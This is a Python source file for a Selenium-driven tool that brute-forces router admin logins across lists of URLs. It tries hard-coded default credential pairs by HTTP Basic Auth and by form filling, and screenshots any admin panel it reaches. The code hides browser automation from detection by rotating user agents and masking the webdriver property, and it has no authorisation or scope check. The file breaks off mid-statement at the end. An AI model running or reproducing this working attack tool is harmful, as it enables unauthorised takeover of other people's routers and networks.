#!/usr/bin/env python3
"""
Router Brute Force Chrome - Chrome-based Router Login Brute Force Tool v2.0
Author: Network Security Engineer
Cross-platform: Windows, Linux, macOS
Chrome-based brute force attack with visible browser and screenshot capture
"""

import os
import sys
import time
import signal
import random
import argparse
import threading
import re
from datetime import datetime
from urllib.parse import urlparse, urljoin
import warnings
warnings.filterwarnings('ignore')

# Try to import selenium libraries
try:
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.chrome.service import Service
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from selenium.common.exceptions import TimeoutException, NoSuchElementException, WebDriverException
    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False
    print("Error: Selenium not available. Please install: pip install selenium")
    sys.exit(1)

# Cross-platform color support
class Colors:
    if os.name == 'nt':  # Windows
        RED = '\033[91m'
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        BLUE = '\033[94m'
        MAGENTA = '\033[95m'
        CYAN = '\033[96m'
        WHITE = '\033[97m'
        BOLD = '\033[1m'
        END = '\033[0m'
    else:  # Linux/macOS
        RED = '\033[91m'
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        BLUE = '\033[94m'
        MAGENTA = '\033[95m'
        CYAN = '\033[96m'
        WHITE = '\033[97m'
        BOLD = '\033[1m'
        END = '\033[0m'

# Global variables
running = True
stats = {'targets_scanned': 0, 'successful_logins': 0, 'screenshots_taken': 0, 'start_time': None}

def signal_handler(sig, frame):
    global running
    print(f"\n{Colors.YELLOW}[!] Stopping scanner safely...{Colors.END}")
    running = False
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def generate_ascii_banner(text):
    """Generate ASCII art banner from text"""
    ascii_patterns = {
        'A': ['  ██  ', ' ████ ', '██  ██', '██████', '██  ██', '██  ██'],
        'B': ['█████ ', '██  ██', '█████ ', '██  ██', '██  ██', '█████ '],
        'C': [' █████', '██    ', '██    ', '██    ', '██    ', ' █████'],
        'D': ['█████ ', '██  ██', '██  ██', '██  ██', '██  ██', '█████ '],
        'E': ['██████', '██    ', '█████ ', '██    ', '██    ', '██████'],
        'F': ['██████', '██    ', '█████ ', '██    ', '██    ', '██    '],
        'G': [' █████', '██    ', '██    ', '██ ███', '██  ██', ' █████'],
        'H': ['██  ██', '██  ██', '██████', '██  ██', '██  ██', '██  ██'],
        'I': ['██████', '  ██  ', '  ██  ', '  ██  ', '  ██  ', '██████'],
        'J': ['██████', '    ██', '    ██', '    ██', '██  ██', ' ████ '],
        'K': ['██  ██', '██ ██ ', '████  ', '██ ██ ', '██  ██', '██  ██'],
        'L': ['██    ', '██    ', '██    ', '██    ', '██    ', '██████'],
        'M': ['██  ██', '██████', '██ ████', '██  ██', '██  ██', '██  ██'],
        'N': ['██  ██', '███ ██', '██████', '██ ███', '██  ██', '██  ██'],
        'O': [' ████ ', '██  ██', '██  ██', '██  ██', '██  ██', ' ████ '],
        'P': ['█████ ', '██  ██', '██  ██', '█████ ', '██    ', '██    '],
        'Q': [' ████ ', '██  ██', '██  ██', '██ ███', '██  ██', ' █████'],
        'R': ['█████ ', '██  ██', '██  ██', '█████ ', '██ ██ ', '██  ██'],
        'S': [' █████', '██    ', '██    ', ' █████', '    ██', '█████ '],
        'T': ['██████', '  ██  ', '  ██  ', '  ██  ', '  ██  ', '  ██  '],
        'U': ['██  ██', '██  ██', '██  ██', '██  ██', '██  ██', ' ████ '],
        'V': ['██  ██', '██  ██', '██  ██', '██  ██', ' ████ ', '  ██  '],
        'W': ['██  ██', '██  ██', '██  ██', '██ ████', '██████', '██  ██'],
        'X': ['██  ██', '██  ██', ' ████ ', ' ████ ', '██  ██', '██  ██'],
        'Y': ['██  ██', '██  ██', ' ████ ', '  ██  ', '  ██  ', '  ██  '],
        'Z': ['██████', '    ██', '   ██ ', '  ██  ', ' ██   ', '██████'],
        ' ': ['      ', '      ', '      ', '      ', '      ', '      ']
    }
    
    text = text.upper()
    lines = [''] * 6
    
    for char in text:
        if char in ascii_patterns:
            pattern = ascii_patterns[char]
            for i in range(6):
                lines[i] += pattern[i] + ' '
        else:
            for i in range(6):
                lines[i] += '      '
    
    banner = f"""
{Colors.GREEN}{Colors.BOLD}"""
    for line in lines:
        banner += line.rstrip() + "\n"
    banner += f"{Colors.END}"
    
    return banner

def print_banner():
    # Matrix rain intro
    try:
        import shutil
        width = shutil.get_terminal_size((80, 24)).columns
    except Exception:
        width = 80
    charset = list("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%&*")
    end_time = time.time() + 2
    columns = [0] * width
    while time.time() < end_time:
        line_chars = []
        for i in range(width):
            if columns[i] <= 0 and random.random() < 0.02:
                columns[i] = random.randint(3, 10)
            if columns[i] > 0:
                line_chars.append(random.choice(charset))
                columns[i] -= 1
            else:
                line_chars.append(' ')
        print(f"{Colors.GREEN}" + ''.join(line_chars) + f"{Colors.END}")
        time.sleep(0.03)
    
    banner_text = "Router Chrome"
    banner = generate_ascii_banner(banner_text)
    print(banner)

# Target credentials - exactly as requested
TARGET_CREDENTIALS = [
    ("admin", "admin"),
    ("admin", "support180"),
    ("support", "support"),
    ("user", "user")
]

# User-Agent rotation for anti-detection
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36'
]

class ChromeRouterBruteForce:
    def __init__(self, login_urls, timeout=10, headless=False, screenshot_dir="screenshots"):
        self.login_urls = login_urls if isinstance(login_urls, list) else [login_urls]
        self.timeout = timeout
        self.headless = headless
        self.screenshot_dir = screenshot_dir
        self.driver = None
        self.lock = threading.Lock()
        
        # Create screenshot directory
        if not os.path.exists(self.screenshot_dir):
            os.makedirs(self.screenshot_dir)
    
    def setup_chrome_driver(self):
        """Setup Chrome driver with cross-platform support"""
        try:
            chrome_options = Options()
            
            # Basic options
            chrome_options.add_argument('--no-sandbox')
            chrome_options.add_argument('--disable-dev-shm-usage')
            chrome_options.add_argument('--disable-gpu')
            chrome_options.add_argument('--disable-logging')
            chrome_options.add_argument('--disable-extensions')
            chrome_options.add_argument('--disable-plugins')
            chrome_options.add_argument('--disable-web-security')
            chrome_options.add_argument('--allow-running-insecure-content')
            chrome_options.add_argument('--ignore-certificate-errors')
            chrome_options.add_argument('--ignore-ssl-errors')
            chrome_options.add_argument('--ignore-certificate-errors-spki-list')
            chrome_options.add_argument('--ignore-certificate-errors-spki-list')
            chrome_options.add_argument('--disable-blink-features=AutomationControlled')
            chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
            chrome_options.add_experimental_option('useAutomationExtension', False)
            
            # Window size
            chrome_options.add_argument('--window-size=1920,1080')
            
            # User agent
            chrome_options.add_argument(f'--user-agent={random.choice(USER_AGENTS)}')
            
            # Headless mode (if requested)
            if self.headless:
                chrome_options.add_argument('--headless')
            
            # Cross-platform Chrome driver setup
            if os.name == 'nt':  # Windows
                # Try to find ChromeDriver in common locations
                possible_paths = [
                    'chromedriver.exe',
                    'C:\\chromedriver\\chromedriver.exe',
                    'C:\\Program Files\\chromedriver\\chromedriver.exe',
                    'C:\\Program Files (x86)\\chromedriver\\chromedriver.exe'
                ]
            else:  # Linux/macOS
                possible_paths = [
                    'chromedriver',
                    '/usr/local/bin/chromedriver',
                    '/usr/bin/chromedriver',
                    '/opt/chromedriver/chromedriver'
                ]
            
            service = None
            for path in possible_paths:
                if os.path.exists(path):
                    service = Service(path)
                    break
            
            # Create driver
            if service:
                self.driver = webdriver.Chrome(service=service, options=chrome_options)
            else:
                # Let Selenium find chromedriver automatically
                self.driver = webdriver.Chrome(options=chrome_options)
            
            # Execute script to remove webdriver property
            self.driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
            
            print(f"{Colors.GREEN}[+] Chrome driver initialized successfully{Colors.END}")
            return True
            
        except Exception as e:
            print(f"{Colors.RED}[!] Failed to initialize Chrome driver: {e}{Colors.END}")
            print(f"{Colors.YELLOW}[!] Please ensure ChromeDriver is installed and in PATH{Colors.END}")
            return False
    
    def detect_login_form(self):
        """Detect login form fields on the page"""
        try:
            # Common field name patterns
            username_fields = [
                'username', 'user', 'login', 'admin', 'name', 'email', 'account',
                'userid', 'user_id', 'loginname', 'login_name', 'uname'
            ]
            
            password_fields = [
                'password', 'pass', 'passwd', 'pwd', 'admin', 'secret', 'key'
            ]
            
            username_field = None
            password_field = None
            
            # Try to find username field
            for field_name in username_fields:
                try:
                    username_field = self.driver.find_element(By.NAME, field_name)
                    break
                except NoSuchElementException:
                    try:
                        username_field = self.driver.find_element(By.ID, field_name)
                        break
                    except NoSuchElementException:
                        continue
            
            # Try to find password field
            for field_name in password_fields:
                try:
                    password_field = self.driver.find_element(By.NAME, field_name)
                    break
                except NoSuchElementException:
                    try:
                        password_field = self.driver.find_element(By.ID, field_name)
                        break
                    except NoSuchElementException:
                        continue
            
            # If not found by name/id, try by type
            if not username_field:
                try:
                    username_field = self.driver.find_element(By.XPATH, "//input[@type='text']")
                except NoSuchElementException:
                    pass
            
            if not password_field:
                try:
                    password_field = self.driver.find_element(By.XPATH, "//input[@type='password']")
                except NoSuchElementException:
                    pass
            
            return username_field, password_field
            
        except Exception as e:
            print(f"{Colors.YELLOW}[!] Error detecting login form: {e}{Colors.END}")
            return None, None
    
    def find_submit_button(self):
        """Find and return submit button"""
        try:
            # Common submit button selectors
            submit_selectors = [
                "//input[@type='submit']",
                "//button[@type='submit']",
                "//input[@value='Login']",
                "//button[contains(text(), 'Login')]",
                "//input[@value='Sign In']",
                "//button[contains(text(), 'Sign In')]",
                "//input[@value='Submit']",
                "//button[contains(text(), 'Submit')]",
                "//input[@value='Enter']",
                "//button[contains(text(), 'Enter')]",
                "//input[@value='OK']",
                "//button[contains(text(), 'OK')]",
                "//input[@value='Go']",
                "//button[contains(text(), 'Go')]"
            ]
            
            for selector in submit_selectors:
                try:
                    submit_button = self.driver.find_element(By.XPATH, selector)
                    return submit_button
                except NoSuchElementException:
                    continue
            
            # If no specific submit button found, try to find any button in a form
            try:
                submit_button = self.driver.find_element(By.XPATH, "//form//button")
                return submit_button
            except NoSuchElementException:
                pass
            
            # Last resort: try to find any input in a form
            try:
                submit_button = self.driver.find_element(By.XPATH, "//form//input")
                return submit_button
            except NoSuchElementException:
                pass
            
            return None
            
        except Exception as e:
            print(f"{Colors.YELLOW}[!] Error finding submit button: {e}{Colors.END}")
            return None
    
    def is_login_successful(self):
        """Check if login was successful by analyzing page content and URL"""
        try:
            current_url = self.driver.current_url.lower()
            page_source = self.driver.page_source.lower()
            
            # Check for admin panel indicators
            admin_indicators = [
                'admin', 'administrator', 'dashboard', 'control panel', 'configuration', 
                'settings', 'system', 'status', 'network', 'router', 'gateway', 'modem',
                'wan', 'lan', 'wireless', 'firewall', 'nat', 'dhcp', 'dns', 'qos',
                'firmware', 'upgrade', 'backup', 'restore', 'reboot', 'restart',
                'main menu', 'welcome', 'logout', 'log out', 'management', 'monitor',
                'device', 'interface', 'port', 'service', 'security', 'advanced'
            ]
            
            # Check for login page indicators (negative)
            login_indicators = [
                'username', 'password', 'login', 'sign in', 'authentication', 'enter credentials',
                'user login', 'admin login', 'router login', 'invalid', 'incorrect', 'failed',
                'error', 'denied', 'wrong', 'access denied', 'please login', 'enter username'
            ]
            
            admin_count = sum(1 for indicator in admin_indicators if indicator in page_source)
            login_count = sum(1 for indicator in login_indicators if indicator in page_source)
            
            # Check if URL changed from login page
            url_changed = not any(login_term in current_url for login_term in ['login', 'signin', 'sign-in', 'auth', 'authentication'])
            
            # Check for specific success indicators
            success_indicators = [
                'logout', 'log out', 'welcome', 'dashboard', 'main menu', 'system status',
                'device status', 'network status', 'router status', 'admin panel'
            ]
            success_count = sum(1 for indicator in success_indicators if indicator in page_source)
            
            # Strong success criteria: URL changed AND has success indicators
            if url_changed and success_count >= 1:
                return True, f"URL changed and success indicators found: {success_count}"
            
            # Success criteria: more admin indicators than login indicators, and URL changed
            if admin_count > login_count and admin_count >= 2 and url_changed:
                return True, f"Admin indicators: {admin_count}, Login indicators: {login_count}"
            
            # Additional check: if we have substantial admin content
            if admin_count >= 3 and login_count <= 1:
                return True, f"Strong admin content detected: {admin_count} indicators"
            
            return False, f"Admin indicators: {admin_count}, Login indicators: {login_count}, Success indicators: {success_count}"
            
        except Exception as e:
            print(f"{Colors.YELLOW}[!] Error checking login success: {e}{Colors.END}")
            return False, f"Error: {e}"
    
    def take_screenshot(self, filename_prefix="login_attempt"):
        """Take screenshot and save it"""
        try:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f"{filename_prefix}_{timestamp}.png"
            filepath = os.path.join(self.screenshot_dir, filename)
            
            self.driver.save_screenshot(filepath)
            print(f"{Colors.GREEN}[+] Screenshot saved: {filepath}{Colors.END}")
            return filepath
            
        except Exception as e:
            print(f"{Colors.RED}[!] Failed to take screenshot: {e}{Colors.END}")
            return None
    
    def quit(self):
        """Quit the browser driver"""
        if hasattr(self, 'driver') and self.driver:
            try:
                self.driver.quit()
            except:
                pass
    
    def handle_alert(self):
        """Handle browser alerts (login failure messages)"""
        try:
            alert = self.driver.switch_to.alert
            alert_text = alert.text
            alert.accept()  # Click OK to dismiss alert
            return alert_text
        except:
            return None
    
    def extract_device_info(self):
        """Extract device information from admin panel"""
        try:
            device_info = {}
            
            # Get page title
            device_info['title'] = self.driver.title
            
            # Try to extract common device information
            page_source = self.driver.page_source.lower()
            
            # Look for manufacturer info
            manufacturer_patterns = ['manufacturer', 'vendor', 'brand', 'model', 'device name', 'product name']
            for pattern in manufacturer_patterns:
                if pattern in page_source:
                    device_info['manufacturer'] = f"Found {pattern}"
                    break
            
            # Look for uptime info
            uptime_patterns = ['uptime', 'system uptime', 'device uptime', 'running time']
            for pattern in uptime_patterns:
                if pattern in page_source:
                    device_info['uptime'] = f"Found {pattern}"
                    break
            
            # Look for firmware version
            firmware_patterns = ['firmware', 'version', 'software version', 'build']
            for pattern in firmware_patterns:
                if pattern in page_source:
                    device_info['firmware'] = f"Found {pattern}"
                    break
            
            # Look for device status
            status_patterns = ['device status', 'system status', 'router status', 'gateway status']
            for pattern in status_patterns:
                if pattern in page_source:
                    device_info['status'] = f"Found {pattern}"
                    break
            
            return device_info
            
        except Exception as e:
            return {'error': str(e)}
    
    def is_admin_panel_loaded(self):
        """Check if we're in admin panel with detailed verification"""
        try:
            current_url = self.driver.current_url
            page_source = self.driver.page_source.lower()
            page_title = self.driver.title.lower()
            
            print(f"{Colors.BLUE}[*] Checking admin panel - URL: {current_url}{Colors.END}")
            print(f"{Colors.BLUE}[*] Page title: {self.driver.title}{Colors.END}")
            
            # Check for error pages
            error_indicators = ['this site can\'t be reached', 'site can\'t be reached', 'connection refused', 'timeout', 'error', 'not found', 'unavailable']
            if any(error in page_source for error in error_indicators):
                return False, "Error page detected"
            
            # Check for admin panel indicators (expanded list)
            admin_indicators = [
                'admin', 'administrator', 'dashboard', 'control panel', 'configuration', 
                'settings', 'system', 'status', 'network', 'router', 'gateway', 'modem',
                'wan', 'lan', 'wireless', 'firewall', 'nat', 'dhcp', 'dns', 'qos',
                'firmware', 'upgrade', 'backup', 'restore', 'reboot', 'restart',
                'main menu', 'welcome', 'logout', 'log out', 'management', 'monitor',
                'device', 'interface', 'port', 'service', 'security', 'advanced',
                'device info', 'system info', 'router info', 'gateway info',
                'home', 'overview', 'summary', 'statistics', 'traffic', 'bandwidth',
                'users', 'clients', 'connected devices', 'wifi', 'ethernet',
                'internet', 'connection', 'ip address', 'subnet', 'dns server',
                'time', 'date', 'timezone', 'language', 'theme', 'appearance'
            ]
            
            # Check for login page indicators (negative)
            login_indicators = [
                'username', 'password', 'login', 'sign in', 'authentication', 'enter credentials',
                'user login', 'admin login', 'router login', 'invalid', 'incorrect', 'failed',
                'error', 'denied', 'wrong', 'access denied', 'please login', 'enter username',
                'login form', 'password field', 'username field', 'submit', 'log in'
            ]
            
            # Check for specific success indicators
            success_indicators = [
                'logout', 'log out', 'welcome', 'dashboard', 'main menu', 'system status',
                'device status', 'network status', 'router status', 'admin panel',
                'device info', 'system info', 'router info', 'gateway info',
                'connected', 'online', 'active', 'running', 'operational'
            ]
            
            admin_count = sum(1 for indicator in admin_indicators if indicator in page_source)
            login_count = sum(1 for indicator in login_indicators if indicator in page_source)
            success_count = sum(1 for indicator in success_indicators if indicator in page_source)
            
            # Check if URL changed from login page
            url_changed = not any(login_term in current_url for login_term in ['login', 'signin', 'sign-in', 'auth', 'authentication'])
            
            print(f"{Colors.BLUE}[*] Analysis - Admin: {admin_count}, Login: {login_count}, Success: {success_count}, URL changed: {url_changed}{Colors.END}")
            
            # More lenient success criteria for HTTP Basic Auth
            # If we have admin indicators and no login indicators, it's likely admin panel
            if admin_count >= 2 and login_count == 0:
                device_info = self.extract_device_info()
                return True, f"Admin panel detected - Admin: {admin_count}, Login: {login_count}, Success: {success_count}, Device: {device_info}"
            
            # Original strict criteria
            if admin_count > login_count and admin_count >= 3 and success_count >= 1 and url_changed:
                device_info = self.extract_device_info()
                return True, f"Admin panel loaded - Admin: {admin_count}, Login: {login_count}, Success: {success_count}, Device: {device_info}"
            
            # If we have significant admin content and URL changed
            if admin_count >= 4 and url_changed and login_count <= 1:
                device_info = self.extract_device_info()
                return True, f"Admin panel detected (high admin content) - Admin: {admin_count}, Login: {login_count}, Success: {success_count}, Device: {device_info}"
            
            return False, f"Not admin panel - Admin: {admin_count}, Login: {login_count}, Success: {success_count}, URL changed: {url_changed}"
            
        except Exception as e:
            return False, f"Error checking admin panel: {e}"
    
    def test_http_basic_auth(self, username, password, login_url):
        """Test HTTP Basic Authentication"""
        try:
            if not hasattr(self, 'driver') or not self.driver:
                return False, "Driver not initialized"
                
            parsed_url = urlparse(login_url)
            auth_url = f"{parsed_url.scheme}://{username}:{password}@{parsed_url.netloc}{parsed_url.path}"
            
            print(f"{Colors.BLUE}[*] Testing HTTP Basic Auth: {username}:{password}{Colors.END}")
            self.driver.get(auth_url)
            time.sleep(5)  # Wait longer for page to load completely
            
            # Check current URL and page content
            current_url = self.driver.current_url
            page_source = self.driver.page_source.lower()
            
            print(f"{Colors.BLUE}[*] After Basic Auth - URL: {current_url}{Colors.END}")
            print(f"{Colors.BLUE}[*] Page title: {self.driver.title}{Colors.END}")
            
            # Check if we successfully bypassed auth (not on error page)
            if "data:," not in current_url and current_url != "about:blank":
                # Check if we're in admin panel
                is_admin, reason = self.is_admin_panel_loaded()
                
                if is_admin:
                    print(f"{Colors.GREEN}[+] HTTP Basic Auth successful! {username}:{password}{Colors.END}")
                    print(f"{Colors.BLUE}[*] Admin panel details: {reason}{Colors.END}")
                    # Wait a bit more for admin panel to fully load
                    time.sleep(3)
                    screenshot_path = self.take_screenshot(f"success_admin_panel_{username}_{password}")
                    return True, screenshot_path
                else:
                    print(f"{Colors.YELLOW}[!] Basic Auth worked but not admin panel: {reason}{Colors.END}")
                    return False, f"HTTP Basic Auth worked but not admin panel: {reason}"
            else:
                print(f"{Colors.YELLOW}[!] Basic Auth failed - still on error page{Colors.END}")
                return False, "HTTP Basic Auth failed - error page"
            
        except Exception as e:
            return False, f"HTTP Basic Auth error: {e}"
    
    def test_credentials(self, username, password, login_url):
        """Test a single set of credentials"""
        try:
            print(f"{Colors.CYAN}[>] Testing credentials: {username}:{password}{Colors.END}")
            
            # First, try HTTP Basic Authentication
            basic_auth_success, basic_auth_result = self.test_http_basic_auth(username, password, login_url)
            if basic_auth_success:
                return True, basic_auth_result
            
            # Navigate to login page for form-based authentication
            self.driver.get(login_url)
            time.sleep(5)  # Wait longer for page to load completely
            
            # Check if page loaded properly (not error page)
            is_admin, reason = self.is_admin_panel_loaded()
            if "Error page detected" in reason:
                print(f"{Colors.YELLOW}[!] Page load error detected, refreshing...{Colors.END}")
                self.driver.refresh()
                time.sleep(5)
            
            # Detect login form
            username_field, password_field = self.detect_login_form()
            
            if not username_field or not password_field:
                print(f"{Colors.RED}[!] Could not find login form fields{Colors.END}")
                return False, "Form fields not found"
            
            # Clear and fill fields
            try:
                username_field.clear()
                password_field.clear()
                username_field.send_keys(username)
                password_field.send_keys(password)
            except Exception as e:
                print(f"{Colors.YELLOW}[!] Could not fill form fields: {e}{Colors.END}")
                return False, f"Form filling error: {e}"
            
            # Find and click submit button
            submit_button = self.find_submit_button()
            if submit_button:
                try:
                    submit_button.click()
                except:
                    # Try pressing Enter on password field
                    password_field.send_keys("\n")
            else:
                # Try pressing Enter on password field
                password_field.send_keys("\n")
            
            # Wait for page to load and handle any alerts
            time.sleep(5)  # Wait longer for page to load completely
            
            # Check for alerts (login failure messages)
            alert_text = self.handle_alert()
            if alert_text:
                print(f"{Colors.YELLOW}[-] Login failed: {alert_text}{Colors.END}")
                return False, f"Alert: {alert_text}"
            
            # Check if login was successful using new method
            success, reason = self.is_admin_panel_loaded()
            
            if success:
                print(f"{Colors.GREEN}[+] Login successful! {reason}{Colors.END}")
                # Wait a bit more for admin panel to fully load
                time.sleep(3)
                # Take screenshot of successful login (admin panel) - ONLY when successful
                screenshot_path = self.take_screenshot(f"success_admin_panel_{username}_{password}")
                return True, screenshot_path
            else:
                print(f"{Colors.YELLOW}[-] Login failed: {reason}{Colors.END}")
                return False, reason
                
        except Exception as e:
            print(f"{Colors.RED}[!] Error testing credentials {username}:{password}: {e}{Colors.END}")
            return False, f"Error: {e}"
    
    def brute_force_single_url(self, login_url):
        """Perform brute force attack on a single URL"""
        try:
            print(f"\n{Colors.CYAN}{'='*60}{Colors.END}")
            print(f"{Colors.CYAN}[*] ATTACKING: {login_url}{Colors.END}")
            print(f"{Colors.CYAN}{'='*60}{Colors.END}")
            
            # Navigate to URL
            self.driver.get(login_url)
            time.sleep(2)
            
            successful_credentials = []
            
            # Test each credential set
            for i, (username, password) in enumerate(TARGET_CREDENTIALS, 1):
                if not running:
                    break
                
                print(f"\n{Colors.YELLOW}[{i}/{len(TARGET_CREDENTIALS)}] Testing credential set {i}{Colors.END}")
                
                success, result = self.test_credentials(username, password, login_url)
                
                if success:
                    print(f"{Colors.RED}🔒 VULNERABLE: {username}:{password} works!{Colors.END}")
                    successful_credentials.append({
                        'url': login_url,
                        'username': username,
                        'password': password,
                        'screenshot': result if isinstance(result, str) and result.endswith('.png') else None
                    })
                    
                    with self.lock:
                        stats['successful_logins'] += 1
                        if result and result.endswith('.png'):
                            stats['screenshots_taken'] += 1
                    
                    # Stop testing other credentials once we find a working one
                    print(f"{Colors.YELLOW}[*] Found working credentials - stopping further tests for this URL{Colors.END}")
                    break
                else:
                    print(f"{Colors.YELLOW}[-] {username}:{password} failed{Colors.END}")
                
                # Update progress
                with self.lock:
                    stats['targets_scanned'] += 1
            
            return successful_credentials
            
        except Exception as e:
            print(f"{Colors.RED}[!] Error attacking {login_url}: {e}{Colors.END}")
            return []
    
    def brute_force_attack(self):
        """Perform brute force attack on all URLs"""
        try:
            print(f"\n{Colors.CYAN}{'='*60}{Colors.END}")
            print(f"{Colors.CYAN}[*] STARTING CHROME BRUTE FORCE ATTACK{Colors.END}")
            print(f"{Colors.CYAN}[*] Total URLs to test: {len(self.login_urls)}{Colors.END}")
            print(f"{Colors.CYAN}{'='*60}{Colors.END}")
            
            # Setup Chrome driver
            if not self.setup_chrome_driver():
                return False
            
            all_successful_credentials = []
            
            # Test each URL
            for i, login_url in enumerate(self.login_urls, 1):
                if not running:
                    break
                
                print(f"\n{Colors.MAGENTA}[URL {i}/{len(self.login_urls)}] Processing: {login_url}{Colors.END}")
                
                successful_credentials = self.brute_force_single_url(login_url)
                all_successful_credentials.extend(successful_credentials)
                
                # Update progress
                print(f"{Colors.BLUE}[*] Progress: {i}/{len(self.login_urls)} URLs processed{Colors.END}")
            
            # Close browser
            if self.driver:
                self.driver.quit()
            
            # Report results
            print(f"\n{Colors.GREEN}{'='*60}{Colors.END}")
            print(f"{Colors.GREEN}[+] BRUTE FORCE ATTACK COMPLETED{Colors.END}")
            print(f"{Colors.GREEN}{'='*60}{Colors.END}")
            
            if all_successful_credentials:
                print(f"{Colors.RED}[!] VULNERABLE ROUTERS FOUND:{Colors.END}")
                for cred in all_successful_credentials:
                    print(f"  • {Colors.WHITE}{cred['url']}{Colors.END} -> {Colors.RED}{cred['username']}:{cred['password']}{Colors.END}")
                    if cred['screenshot']:
                        print(f"    Screenshot: {Colors.CYAN}{cred['screenshot']}{Colors.END}")
            else:
                print(f"{Colors.GREEN}[+] No vulnerable routers found - all routers appear secure{Colors.END}")
            
            return len(all_successful_credentials) > 0
            
        except Exception as e:
            print(f"{Colors.RED}[!] Error during brute force attack: {e}{Colors.END}")
            if self.driver:
                self.driver.quit()
            return False

def parse_login_urls(url_input):
    """Parse and validate login URLs from input (single URL or file)"""
    urls = []
    
    # Check if input is a file
    if url_input.endswith('.txt') and os.path.exists(url_input):
        try:
            with open(url_input, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):  # Skip empty lines and comments
                        # Add http:// if no scheme provided
                        if not line.startswith(('http://', 'https://')):
                            line = 'http://' + line
                        urls.append(line)
            print(f"{Colors.GREEN}[+] Loaded {len(urls)} URLs from file: {url_input}{Colors.END}")
        except Exception as e:
            print(f"{Colors.RED}[!] Error reading file {url_input}: {e}{Colors.END}")
            return []
    else:
        # Single URL
        if not url_input.startswith(('http://', 'https://')):
            url_input = 'http://' + url_input
        urls.append(url_input)
    
    # Validate URLs
    valid_urls = []
    for url in urls:
        try:
            parsed = urlparse(url)
            # Check if hostname is valid (contains at least one dot or is localhost)
            if parsed.hostname and ('.' in parsed.hostname or parsed.hostname == 'localhost'):
                valid_urls.append(url)
            else:
                print(f"{Colors.YELLOW}[!] Invalid URL skipped: {url}{Colors.END}")
        except:
            print(f"{Colors.YELLOW}[!] Invalid URL skipped: {url}{Colors.END}")
    
    return valid_urls

def main():
    parser = argparse.ArgumentParser(description="Router Brute Force Chrome v2.0 - Chrome-based Router Login Brute Force Tool")
    parser.add_argument('-u', '--url', required=True, help='Login URL to test (single URL or .txt file with URLs)')
    parser.add_argument('--timeout', type=int, default=10, help='Page load timeout in seconds (default: 10)')
    parser.add_argument('--headless', action='store_true', help='Run Chrome in headless mode (default: visible)')
    parser.add_argument('--screenshot-dir', default='screenshots', help='Directory to save screenshots (default: screenshots)')
    
    args = parser.parse_args()
    
    clear_screen()
    print_banner()
    
    # Parse URLs (single URL or file)
    login_urls = parse_login_urls(args.url)
    if not login_urls:
        print(f"{Colors.RED}[!] No valid URLs found in: {args.url}{Colors.END}")
        return
    
    # Check if Selenium is available
    if not SELENIUM_AVAILABLE:
        print(f"{Colors.RED}[!] Selenium is not available. Please install: pip install selenium{Colors.END}")
        return
    
    # Startup info
    if len(login_urls) == 1:
        print(f"{Colors.GREEN}[+] Target URL: {login_urls[0]}{Colors.END}")
    else:
        print(f"{Colors.GREEN}[+] Target URLs: {len(login_urls)} URLs loaded{Colors.END}")
        for i, url in enumerate(login_urls[:5], 1):  # Show first 5 URLs
            print(f"  {i}. {url}")
        if len(login_urls) > 5:
            print(f"  ... and {len(login_urls) - 5} more URLs")
    
    creds_str = ", ".join([f"{u}:{p}" for u,p in TARGET_CREDENTIALS])
    print(f"{Colors.YELLOW}[*] Target credentials: {creds_str}{Colors.END}")
    print(f"{Colors.BLUE}[*] Chrome-based brute force with visible browser{Colors.END}")
    print(f"{Colors.MAGENTA}[*] Workflow: Open Chrome → Navigate → Test Credentials → Screenshot{Colors.END}")
    
    if args.headless:
        print(f"{Colors.YELLOW}[!] Running in headless mode{Colors.END}")
    else:
        print(f"{Colors.GREEN}[+] Chrome will be visible during attack{Colors.END}")
    
    # Initialize brute force tool
    brute_force = ChromeRouterBruteForce(
        login_urls=login_urls,
        timeout=args.timeout,
        headless=args.headless,
        screenshot_dir=args.screenshot_dir
    )
    
    stats['start_time'] = time.time()
    
    try:
        # Start brute force attack
        success = brute_force.brute_force_attack()
        
        # Final statistics
        total_time = time.time() - stats['start_time']
        
        print(f"\n{Colors.CYAN}[*] FINAL STATISTICS:{Colors.END}")
        print(f"  - Total URLs tested: {Colors.CYAN}{len(login_urls)}{Colors.END}")
        print(f"  - Total credentials tested: {Colors.CYAN}{stats['targets_scanned']}{Colors.END}")
        print(f"  - Successful logins: {Colors.RED}{stats['successful_logins']}{Colors.END}")
        print(f"  - Screenshots taken: {Colors.BLUE}{stats['screenshots_taken']}{Colors.END}")
        print(f"  - Attack duration: {Colors.MAGENTA}{total_time:.1f}{Colors.END} seconds")
        print(f"  - Screenshots saved in: {Colors.YELLOW}{args.screenshot_dir}{Colors.END}")
        
        if success:
